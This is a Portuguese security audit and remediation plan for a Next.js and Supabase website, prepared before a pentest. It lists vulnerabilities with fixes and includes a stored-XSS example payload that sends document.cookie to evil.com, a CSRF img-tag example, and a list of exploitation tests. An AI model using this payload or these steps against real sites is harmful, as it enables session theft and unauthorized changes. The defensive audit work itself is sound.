# PLANO DE SEGURANCA — rodrigo.wtf

> Auditoria de seguranca preparatoria para pentest profissional.
> Data: 2026-03-23

---

## RESUMO EXECUTIVO

O site rodrigo.wtf e uma aplicacao Next.js 16 com Supabase (auth + banco + storage), Mapbox GL (mapa de ruido) e Resend (email). Possui um painel administrativo protegido por Google OAuth, endpoints publicos para newsletter e reporte de ruido, e um sistema de conteudo com Markdown.

**Foram identificadas vulnerabilidades criticas que permitem acesso administrativo completo sem autenticacao.**

---

## INVENTARIO DE SUPERFICIE DE ATAQUE

### Endpoints publicos (sem autenticacao)
| Rota | Metodo | Funcao |
|------|--------|--------|
| `POST /api/subscribe` | POST | Inscrever email na newsletter |
| `GET /api/unsubscribe?email=` | GET | Cancelar inscricao (DESTRUTIVO via GET) |
| `POST {supabase}/functions/v1/validate-noise-report` | POST | Reportar ruido no mapa |
| `POST {supabase}/functions/v1/validate-noise-segment` | POST | Enviar segmento de trajeto |

### Endpoints protegidos (admin)
| Rota | Metodo | Funcao |
|------|--------|--------|
| `POST /api/newsletter/send` | POST | Disparar newsletter |
| Server Action: `createPost` | POST | Criar post |
| Server Action: `updatePost` | POST | Editar post |
| Server Action: `deletePost` | POST | Deletar post |
| Server Action: `uploadImage` | POST | Upload de imagem |

### Painel administrativo
| Rota | Funcao |
|------|--------|
| `/admin` | Lista de posts |
| `/admin/novo` | Criar novo post |
| `/admin/[id]` | Editar post existente |
| `/admin/login` | Login com Google OAuth |

---

## VULNERABILIDADES ENCONTRADAS

### ~~[CRITICO] V-001: Middleware NAO esta ativo~~ — FALSO POSITIVO

**Status:** NAO E VULNERABILIDADE.
O Next.js 16 substituiu `middleware.ts` por `proxy.ts` como convencao nativa. O build confirma: `f Proxy (Middleware)` aparece no output. O `proxy.ts` **ja estava ativo** e protegendo rotas `/admin/*`. Nenhuma correcao necessaria.

> **Nota:** O middleware protege rotas de pagina (UI), mas NAO impede invocacao direta de Server Actions. Por isso V-002 continua sendo critica.

---

### [CRITICO] V-002: Server Actions sem verificacao de autenticacao

**Arquivo:** `src/app/admin/actions.ts`
**Problema:** As funcoes `createPost`, `updatePost`, `deletePost` e `uploadImage` usam `createSupabaseAdmin()` (service role key que bypassa RLS) mas **NAO verificam se o usuario e admin**. Elas dependem inteiramente do middleware (que esta inativo - V-001) e do layout (que so protege a UI, nao as actions).

**Como explorar:** Um atacante pode invocar server actions diretamente via POST para o endpoint interno do Next.js, sem nenhuma sessao autenticada. Isso permite:
- Criar posts arbitrarios (incluindo conteudo malicioso)
- Editar/sobrescrever qualquer post existente
- Deletar todos os posts do site
- Fazer upload de arquivos arbitrarios para o storage

**Correcao:**
```typescript
// Adicionar no INICIO de cada server action:
async function requireAdmin() {
  const supabase = await createSupabaseServer();
  const { data: { user } } = await supabase.auth.getUser();
  if (!user || user.email !== process.env.ADMIN_EMAIL) {
    throw new Error("Unauthorized");
  }
  return user;
}

export async function createPost(formData: FormData) {
  await requireAdmin();  // <-- OBRIGATORIO
  // ... resto da logica
}
```

**Prioridade:** IMEDIATA

---

### [CRITICO] V-003: Upload de arquivo sem validacao de tipo

**Arquivo:** `src/app/admin/actions.ts:107-125`
**Problema:** A funcao `uploadImage`:
1. Extrai extensao do nome do arquivo (facilmente falsificavel): `file.name.split(".").pop()`
2. Usa `file.type` do browser como contentType (falsificavel)
3. NAO valida magic bytes do arquivo
4. NAO restringe extensoes permitidas
5. Limite de tamanho de 5MB apenas via `next.config.ts` (nao na action)

**Como explorar:** Um atacante pode fazer upload de arquivos executaveis (`.html`, `.svg` com JS, etc.) no bucket publico do Supabase Storage.

**Correcao:**
```typescript
const ALLOWED_TYPES = ["image/jpeg", "image/png", "image/webp", "image/avif", "image/gif"];
const ALLOWED_EXTS = ["jpg", "jpeg", "png", "webp", "avif", "gif"];
const MAX_SIZE = 5 * 1024 * 1024; // 5MB

export async function uploadImage(formData: FormData): Promise<string> {
  await requireAdmin();

  const file = formData.get("file") as File;
  if (!file || file.size === 0) throw new Error("No file");
  if (file.size > MAX_SIZE) throw new Error("File too large");

  const ext = file.name.split(".").pop()?.toLowerCase();
  if (!ext || !ALLOWED_EXTS.includes(ext)) throw new Error("Invalid extension");

  // Validar magic bytes
  const buffer = Buffer.from(await file.arrayBuffer());
  const isValidImage = validateImageMagicBytes(buffer);
  if (!isValidImage) throw new Error("Invalid file content");

  // ... upload
}
```

**Prioridade:** IMEDIATA

---

### [ALTO] V-004: Unsubscribe via GET — CSRF e enumeracao de emails

**Arquivo:** `src/app/api/unsubscribe/route.ts`
**Problema:**
1. **Acao destrutiva via GET**: Deletar inscricao com `GET /api/unsubscribe?email=x` permite CSRF trivial (basta um `<img src="/api/unsubscribe?email=victim@...">` em qualquer pagina)
2. **Sem confirmacao**: Deleta imediatamente sem pedir confirmacao
3. **Email no URL**: Expoe emails em logs de servidor, historico do browser, referrer headers
4. **Sem token**: Qualquer pessoa pode cancelar a inscricao de qualquer email

**Correcao:**
- Mudar para POST com token HMAC unico por assinante
- Ou adicionar token assinado na URL: `/api/unsubscribe?token=HMAC(email+secret)`
- Exibir pagina de confirmacao antes de deletar
- Usar signed unsubscribe link no email

**Prioridade:** ALTA

---

### [ALTO] V-005: Sem rate limiting em nenhum endpoint

**Problema:** Nenhum endpoint tem rate limiting server-side:
| Endpoint | Risco |
|----------|-------|
| `POST /api/subscribe` | Subscription bombing (cadastrar milhares de emails falsos) |
| `GET /api/unsubscribe` | Mass unsubscribe de todos os assinantes |
| `POST /api/newsletter/send` | Spam em massa (se admin auth for burlado) |
| Edge Functions de reporte | Flood de reportes falsos poluindo o mapa |

**Nota:** O cooldown de 5 minutos no `ReportButton.tsx` e **apenas client-side** (localStorage). Pode ser ignorado abrindo aba anonima, limpando storage, ou chamando a API diretamente.

**Correcao:**
- Implementar rate limiting no nivel do Vercel (ou middleware Next.js)
- Usar `@upstash/ratelimit` ou headers `X-Forwarded-For` com store em Redis/KV
- Rate limits sugeridos:
  - `/api/subscribe`: 5 req/min por IP
  - `/api/unsubscribe`: 3 req/min por IP
  - Edge Functions: 10 req/min por IP (ou por anon key)
  - `/api/newsletter/send`: 2 req/min (alem da auth)

**Prioridade:** ALTA

---

### [ALTO] V-006: XSS via Markdown com rehypeRaw

**Arquivo:** `src/components/PostContent.tsx:17`
**Problema:** O plugin `rehype-raw` permite HTML cru no Markdown. Se combinado com V-002 (server actions sem auth), um atacante pode:
1. Criar/editar um post com payload XSS no conteudo Markdown
2. O HTML malicioso sera renderizado para todos os visitantes

**Exemplo de payload:**
```markdown
Texto normal do post.

<img src=x onerror="document.location='https://evil.com/?c='+document.cookie">
```

**Nota:** Mesmo com V-002 corrigido, se o admin for comprometido, o rehypeRaw ainda e um vetor de XSS stored.

**Correcao:**
- Usar `rehype-sanitize` apos `rehype-raw` para filtrar tags perigosas
- Ou substituir `rehype-raw` por uma allowlist de tags HTML seguras

```typescript
import rehypeSanitize from "rehype-sanitize";

rehypePlugins={[rehypeRaw, rehypeSanitize, rehypeHighlight]}
```

**Prioridade:** ALTA

---

### [ALTO] V-007: IDOR em Server Actions (deletePost, updatePost)

**Arquivo:** `src/app/admin/actions.ts`
**Problema:** As funcoes `updatePost` e `deletePost` recebem `id` via `formData.get("id")` e operam diretamente no banco com `createSupabaseAdmin()` (service role). Como nao ha auth check (V-002), qualquer pessoa pode:
- Editar qualquer post passando um UUID arbitrario
- Deletar qualquer post passando seu ID

Mesmo com auth corrigido, nao ha validacao de ownership — mas como so existe um admin, isso e menos critico apos correcao de V-002.

**Correcao:** Alem de corrigir V-002, validar que o ID existe antes de operar:
```typescript
export async function deletePost(formData: FormData) {
  await requireAdmin();
  const id = formData.get("id") as string;
  if (!id || !isValidUUID(id)) throw new Error("Invalid ID");
  // ... resto
}
```

**Prioridade:** ALTA (dependente de V-002)

---

### [MEDIO] V-008: Newsletter send — race condition e spam

**Arquivo:** `src/app/api/newsletter/send/route.ts`
**Problema:**
1. **Race condition:** Nao ha lock ou flag `newsletter_sent_at` no post. Clicar multiplas vezes rapidamente pode disparar a newsletter duplicada para todos os assinantes.
2. **Sem idempotencia:** Nada impede enviar a mesma newsletter novamente.

**Correcao:**
- Adicionar coluna `newsletter_sent_at` na tabela `posts`
- Verificar se ja foi enviado antes de processar
- Usar transacao ou flag atomica no banco

```typescript
// Verificar se ja enviou
if (post.newsletter_sent_at) {
  return NextResponse.json({ error: "Newsletter ja enviada." }, { status: 409 });
}

// Marcar como enviado ANTES de enviar (para evitar race condition)
await supabase.from("posts").update({ newsletter_sent_at: new Date().toISOString() }).eq("id", postId);
```

**Prioridade:** MEDIA

---

### [MEDIO] V-009: Email validation insuficiente no subscribe

**Arquivo:** `src/app/api/subscribe/route.ts:8`
**Problema:** Validacao de email e apenas `email.includes("@")`. Isso aceita:
- `@` (string com apenas @)
- `a@b` (sem dominio valido)
- Emails com espacos e caracteres invalidos (apos trim)

**Correcao:** Usar regex mais robusto:
```typescript
const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
if (!email || typeof email !== "string" || !EMAIL_RE.test(email.trim())) {
  return NextResponse.json({ error: "Email invalido." }, { status: 400 });
}
```

**Prioridade:** MEDIA

---

### [MEDIO] V-010: Categorias do subscribe sem validacao server-side

**Arquivo:** `src/app/api/subscribe/route.ts`
**Problema:** O array `categories` e validado apenas como "e um array nao vazio". Nao valida se os valores sao categorias validas. Um atacante pode inserir categorias arbitrarias no banco.

**Correcao:**
```typescript
const VALID_CATEGORIES = ["analises", "projetos", "ferramentas"];
const validCategories = categories.filter((c: string) => VALID_CATEGORIES.includes(c));
if (validCategories.length === 0) {
  return NextResponse.json({ error: "Categoria invalida." }, { status: 400 });
}
```

**Prioridade:** MEDIA

---

### [MEDIO] V-011: Sem CSRF token explicito nos API routes

**Problema:** Os API routes (`/api/subscribe`, `/api/unsubscribe`, `/api/newsletter/send`) nao verificam CSRF tokens. Server Actions do Next.js tem protecao CSRF automatica, mas API routes nao.

**Correcao:**
- Para `/api/subscribe`: Verificar header `Origin` ou `Referer`
- Para `/api/newsletter/send`: Ja tem auth check, mas adicionar origin check
- Para `/api/unsubscribe`: Migrar para POST + token assinado (ver V-004)

**Prioridade:** MEDIA

---

### [MEDIO] V-012: Slug injection e path traversal

**Arquivo:** `src/app/admin/actions.ts`
**Problema:** O slug do post e aceito como string livre e usado em `revalidatePath()`. Nao ha validacao de formato (alfanumerico + hifens). Um slug malicioso poderia conter:
- Caracteres de path traversal (`../`)
- Caracteres especiais que afetam rotas

**Correcao:**
```typescript
const SLUG_RE = /^[a-z0-9]+(?:-[a-z0-9]+)*$/;
if (!SLUG_RE.test(slug)) throw new Error("Slug invalido");
```

**Prioridade:** MEDIA

---

### [BAIXO] V-013: Console.error em producao pode vazar informacao

**Arquivo:** `src/app/api/newsletter/send/route.ts:111`
**Problema:** `console.error(err)` em producao pode logar stack traces com informacoes sensiveis.

**Correcao:** Usar logging estruturado e nao logar objetos de erro completos em producao.

**Prioridade:** BAIXA

---

### [BAIXO] V-014: Cookie de idioma sem flags de seguranca

**Arquivo:** `src/contexts/LanguageContext.tsx`
**Problema:** Cookie `lang` setado via `document.cookie` sem flags `Secure` ou `SameSite`.

**Correcao:**
```typescript
document.cookie = `lang=${next};path=/;max-age=31536000;SameSite=Lax;Secure`;
```

**Prioridade:** BAIXA

---

### [BAIXO] V-015: Geolocalizacao sem anonimizacao

**Arquivo:** `src/app/ferramentas/mapa-do-sossego/_components/ReportButton.tsx`
**Problema:** Coordenadas GPS exatas sao enviadas para o servidor. Sem anonimizacao ou arredondamento, pode-se rastrear a localizacao exata de quem reportou.

**Correcao:** Arredondar coordenadas (ex: 3 casas decimais = ~111m de precisao):
```typescript
lng: Math.round(coords.longitude * 1000) / 1000,
lat: Math.round(coords.latitude * 1000) / 1000,
```

**Prioridade:** BAIXA (depende de requisitos de precisao)

---

## CHECKLIST DE SEGURANCA POR CATEGORIA

### SQL Injection
- [x] Todas as queries usam Supabase query builder (parametrizado) — **SEGURO**
- [x] Nao ha queries SQL raw no codigo da aplicacao
- [x] RLS ativo nas tabelas `posts` e `comments`
- [ ] **FALTA:** RLS na tabela `subscribers` (nao definido na migration)
- [ ] **FALTA:** RLS nas tabelas de noise reports (nao visivel na migration)

### XSS (Cross-Site Scripting)
- [ ] **V-006:** `rehype-raw` permite HTML arbitrario em posts
- [x] Comentarios renderizados como texto puro (seguro)
- [x] `dangerouslySetInnerHTML` usado apenas com codigo hardcoded (seguro)
- [x] CSP configurado com allowlist (mitiga parcialmente)
- [ ] **FALTA:** `rehype-sanitize` para filtrar HTML perigoso

### IDOR (Insecure Direct Object Reference)
- [ ] **V-007:** Server actions aceitam IDs sem auth check
- [x] Posts publicos protegidos por RLS (so published_at != null)
- [x] UUIDs randomicos (dificil adivinhar, mas nao impossivel)

### Race Condition
- [ ] **V-008:** Newsletter send sem idempotencia
- [x] Subscribe usa UPSERT (idempotente por email)
- [ ] **FALTA:** Lock no envio de newsletter

### CSRF (Cross-Site Request Forgery)
- [x] Server Actions do Next.js tem CSRF automatico
- [ ] **V-004:** Unsubscribe via GET (CSRF trivial)
- [ ] **V-011:** API routes sem verificacao de origin

### Autenticacao e Autorizacao
- [ ] **V-001:** Middleware NAO ativo
- [ ] **V-002:** Server actions sem auth check
- [x] Auth callback valida email do admin
- [x] Admin layout valida email (mas so protege UI)
- [x] Newsletter send tem auth check independente

### Rate Limiting e DoS
- [ ] **V-005:** Zero rate limiting em todos os endpoints
- [ ] Cooldown de reporte e apenas client-side
- [x] Body size limit de 5MB (mitiga upload abuse parcialmente)

### Headers de Seguranca
- [x] X-Content-Type-Options: nosniff
- [x] X-Frame-Options: SAMEORIGIN
- [x] Strict-Transport-Security (HSTS)
- [x] Content-Security-Policy configurado
- [x] Referrer-Policy: strict-origin-when-cross-origin
- [x] Permissions-Policy restritivo

### Secrets e Configuracao
- [x] `.env.local` esta no `.gitignore` (regra `.env*`)
- [x] Service role key so usado server-side
- [x] Anon key e publico por design (com RLS)
- [ ] **VERIFICAR:** Se `.env.local` ja foi commitado no historico git

---

## PLANO DE CORRECAO — ORDEM DE PRIORIDADE

### FASE 1: CRITICA (fazer AGORA, antes do pentest)

| # | Vulnerabilidade | Acao | Arquivo |
|---|----------------|------|---------|
| ~~1~~ | ~~V-001~~ | ~~Criar middleware.ts~~ — FALSO POSITIVO, proxy.ts ja ativo no Next.js 16 | N/A |
| 2 | V-002 | Adicionar `requireAdmin()` em todas as server actions — **CORRIGIDO** | `src/app/admin/actions.ts` |
| 3 | V-003 | Validar tipo de arquivo, extensao e magic bytes no upload — **CORRIGIDO** | `src/app/admin/actions.ts` |

### FASE 2: ALTA (fazer antes do pentest se possivel)

| # | Vulnerabilidade | Acao | Arquivo |
|---|----------------|------|---------|
| 4 | V-004 | Migrar unsubscribe para POST + token HMAC | `src/app/api/unsubscribe/route.ts` |
| 5 | V-005 | Implementar rate limiting (Upstash ou similar) | Middleware / API routes |
| 6 | V-006 | Adicionar `rehype-sanitize` ao pipeline Markdown | `src/components/PostContent.tsx` |
| 7 | V-007 | Validar UUID e ownership nos server actions | `src/app/admin/actions.ts` |

### FASE 3: MEDIA (ideal antes do pentest)

| # | Vulnerabilidade | Acao | Arquivo |
|---|----------------|------|---------|
| 8 | V-008 | Adicionar `newsletter_sent_at` + idempotencia | Migration + API route |
| 9 | V-009 | Melhorar validacao de email | `src/app/api/subscribe/route.ts` |
| 10 | V-010 | Validar categorias no servidor | `src/app/api/subscribe/route.ts` |
| 11 | V-011 | Verificar Origin header nos API routes | API routes |
| 12 | V-012 | Validar formato do slug | `src/app/admin/actions.ts` |

### FASE 4: BAIXA (boas praticas)

| # | Vulnerabilidade | Acao | Arquivo |
|---|----------------|------|---------|
| 13 | V-013 | Remover console.error em producao | API routes |
| 14 | V-014 | Adicionar Secure + SameSite no cookie | Context |
| 15 | V-015 | Arredondar coordenadas GPS | ReportButton |

---

## NOTAS ADICIONAIS

### Supabase Edge Functions
As Edge Functions `validate-noise-report` e `validate-noise-segment` NAO foram auditadas neste documento pois o codigo delas nao esta no repositorio local. **Recomendacao:** auditar separadamente no dashboard do Supabase, verificando:
- Validacao de input (noise_type, coordenadas)
- Rate limiting server-side
- RLS nas tabelas de destino

### Tabela `subscribers` — RLS
A tabela `subscribers` nao aparece na migration SQL. Verificar no Supabase dashboard se:
- RLS esta ativo
- Politicas de SELECT, INSERT, UPDATE, DELETE estao configuradas
- Anon key NAO pode ler emails diretamente

### Historico Git
Verificar se secrets foram commitados no historico: `git log --all --oneline -S "SUPABASE_SERVICE_ROLE_KEY"`. Se sim, considerar rotacionar todas as chaves.

### Testes recomendados para o pentest
1. Chamar server actions diretamente sem sessao (V-002)
2. Upload de arquivo `.html` ou `.svg` com XSS (V-003)
3. CSRF no unsubscribe via tag img (V-004)
4. Flood de requests sem rate limit (V-005)
5. XSS stored via Markdown com HTML raw (V-006)
6. Race condition no envio de newsletter (V-008)
7. Enumerar posts/IDs via tentativa e erro
8. Verificar se Supabase anon key permite queries nao autorizadas
